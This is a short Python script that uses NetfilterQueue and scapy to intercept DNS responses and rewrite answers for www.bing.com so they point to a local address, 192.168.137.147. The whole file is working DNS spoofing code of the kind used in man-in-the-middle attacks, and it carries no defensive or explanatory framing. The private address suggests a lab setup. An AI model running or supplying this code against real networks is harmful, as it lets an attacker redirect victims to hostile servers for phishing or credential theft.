#!/usr/bin/env python
from netfilterqueue import NetfilterQueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        site = "www.bing.com"
        if site in str(qname):
            print("[+] spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.137.147")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            # print(answer.show())
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))
        # print(scapy_packet.show())
    # print(scapy_packet.show())
    packet.accept()
    # packet.drop()


queue = NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
